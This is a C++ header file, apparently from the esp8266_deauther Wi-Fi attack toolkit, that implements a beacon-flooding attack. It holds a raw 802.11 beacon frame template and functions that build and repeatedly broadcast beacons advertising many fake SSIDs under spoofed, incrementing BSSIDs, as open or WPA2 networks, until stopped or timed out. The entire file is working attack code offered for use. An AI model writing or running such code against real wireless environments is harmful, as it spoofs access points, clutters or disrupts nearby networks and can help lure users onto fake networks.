/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#pragma once

// ========== BEACON PACKET ========== //
uint8_t beacon_pkt[] = {
    // [22]
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination MAC
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC

    // Fixed parameters [14]
    /* 22 - 23 */ 0x00, 0x00,                                     // Fragment & sequence number (handled by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03,                                     // Interval: [0x64, 0x00] => 100ms, [0xe8, 0x03] => 1s
    /* 34 - 35 */ 0x31, 0x00,                                     // Capabilities Tnformation 0x21 = OPEN, 0x31 = ENCRYPTED

    // Tagged parameters

    // SSID parameters [2+ssid]
    /* 36 - 37 */ 0x00, 0x20,             // Tag: Set SSID length, Tag length: 32
    /* 38 -    */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*    - 69 */ 0x00, 0x00, 0x00, 0x00, // SSID

    // Supported Rates [10]
    /* 70 - 71 */ 0x01, 0x08,             // Tag: Supported Rates, Tag length: 8
    /*    72   */ 0x82,                   // 1(B)
    /*    73   */ 0x84,                   // 2(B)
    /*    74   */ 0x8b,                   // 5.5(B)
    /*    75   */ 0x96,                   // 11(B)
    /*    76   */ 0x24,                   // 18
    /*    77   */ 0x30,                   // 24
    /*    78   */ 0x48,                   // 36
    /*    79   */ 0x6c,                   // 54

    // Current Channel [3]
    /* 80 - 81 */ 0x03, 0x01,             // Channel set, length
    /*    82   */ 0x01,                   // Current Channel

    // RSN information
    /* 83 - 84 */ 0x30, 0x18,
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};

// ========== ATTACK DATA ========== //
typedef struct beacon_attack_data_t {
    SortedStringList ssids;
    uint8_t          bssid[6];
    uint8_t          receiver[6];
    int              enc;
    uint8_t          ch;
    unsigned long    timeout;
    unsigned long    start_time;
    unsigned long    pkts_sent;
    unsigned long    pkts_per_second;
    unsigned long    pkt_time;
    unsigned long    pkt_interval;
} beacon_attack_data_t;

beacon_attack_data_t beacon_data;

// ========== SEND FUNCTION ========== //
bool send_beacon(uint8_t ch, uint8_t* bssid, uint8_t* receiver, const char* ssid, int enc) {
    size_t ssid_len = strlen(ssid);

    if (ssid_len > 32) ssid_len = 32;
    uint16_t pkt_len = 0;

    uint8_t frame[109];

    // MAC header
    memcpy(&frame[0], &beacon_pkt[0], 4);
    memcpy(&frame[4], receiver, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    pkt_len += 4 + 6 + 6 + 6;

    // Fixed parameters
    memcpy(&frame[22], &beacon_pkt[22], 14);
    pkt_len += 14;

    // SSID
    frame[pkt_len]   = 0x00;
    frame[pkt_len+1] = ssid_len;
    memcpy(&frame[pkt_len+2], ssid, ssid_len);
    pkt_len += 2 + ssid_len;

    // Supported Rates
    memcpy(&frame[pkt_len], &beacon_pkt[70], 10);
    pkt_len += 10;

    // Channel
    memcpy(&frame[pkt_len], &beacon_pkt[80], 2);
    frame[pkt_len+2] = ch;
    pkt_len         += 2+ 1;

    // RSN
    switch (enc) {
        case ENCRYPTION_OPEN:
            frame[34] = 0x21;
            return send(ch, frame, pkt_len);
        case ENCRYPTION_WPA2:
            frame[34] = 0x31;

            memcpy(&frame[pkt_len], &beacon_pkt[83], 26);
            pkt_len += 26;

            return send(ch, frame, pkt_len);
        default:
            return false;
    }
}

// ========== ATTACK FUNCTIONS ========== //
void startBeacon(StringList& ssid_list, uint8_t* bssid, uint8_t* receiver, int enc, uint8_t ch, unsigned long timeout) {
    { // Error checks
        if (ssid_list.size() == 0) {
            debuglnF("ERROR: No SSIDs specified");
            return;
        }

        if (!bssid || !receiver) {
            debuglnF("ERROR: MAC address not specified");
            return;
        }

        if ((ch < 1) || (ch > 14)) {
            debuglnF("ERROR: Invalid channel");
            return;
        }
    }

    stopBeacon();

    { // Output
        debuglnF("[ ===== Beacon Attack ===== ]");

        debugF("BSSID:      ");
        debugln(strh::mac(bssid));

        debugF("Receiver:   ");
        debugln(strh::mac(receiver));

        debugF("Channel:    ");
        debugln(ch);

        debugF("Encryption: ");

        switch (enc) {
            case ENCRYPTION_OPEN:
                debuglnF("none (open)");
                break;
            case ENCRYPTION_WPA2:
                debuglnF("WPA2");
                break;
        }

        debugF("Timeout:    ");
        if (timeout > 0) debugln(strh::time(timeout));
        else debuglnF("-");

        debugF("SSIDs:      ");
        debugln(ssid_list.size());

        debugln();

        debuglnF("SSID                               BSSID");
        debuglnF("====================================================");

        uint8_t _bssid[6];
        memcpy(_bssid, bssid, 6);

        uint8_t last_byte = _bssid[5];

        ssid_list.begin();

        while (ssid_list.available()) {
            _bssid[5] = last_byte++;
            debug(strh::left(34, '"' + ssid_list.iterate() + '"'));
            debug(' ');
            debugln(strh::mac(bssid));
        }

        debuglnF("====================================================");

        debugln();
        debuglnF("Type 'stop' receiver stop the attack");
        debugln();
    }

    unsigned long current_time = millis();

    beacon_data.ssids.moveFrom(ssid_list);
    memcpy(beacon_data.bssid, bssid, 6);
    memcpy(beacon_data.receiver, receiver, 6);
    beacon_data.enc          = enc;
    beacon_data.ch           = ch;
    beacon_data.timeout      = timeout;
    beacon_data.start_time   = current_time;
    beacon_data.pkts_sent    = 0;
    beacon_data.pkt_time     = current_time;
    beacon_data.pkt_interval = 100;
}

void stopBeacon() {
    if (beacon_data.ssids.size() > 0) {
        beacon_data.pkts_sent += beacon_data.pkts_per_second;
        beacon_data.ssids.clear();

        debugF("Beacon attack stopped. Sent ");
        debug(beacon_data.pkts_sent);
        debuglnF(" packets.");
    }
}

void updateBeacon() {
    beacon_attack_data_t& b = beacon_data;

    if (b.ssids.size() > 0) {
        if (((b.timeout > 0) && (millis() - b.start_time > b.timeout))) {
            stopBeacon();
            return;
        }

        if (millis() - b.pkt_time >= b.pkt_interval) {
            b.pkt_time = millis();
            b.ssids.begin();

            uint8_t bssid[6];
            memcpy(bssid, b.bssid, 6);

            uint8_t last_byte = bssid[5];

            for (int i = 0; i<b.ssids.size(); ++i) {
                bssid[5] = last_byte++;

                String ssid = b.ssids.iterate();

                b.pkts_per_second += send_beacon(b.ch, bssid, b.receiver, ssid.c_str(), b.enc);
                delay(1);
            }
        }
    }
}

bool beaconBSSID(uint8_t* bssid) {
    return (beacon_data.ssids.size() > 0) && (memcmp(bssid, beacon_data.bssid, 5) == 0);
}

String getBeacon(uint8_t num) {
    return beacon_data.ssids.get(beacon_data.bssid[5] - num);
}
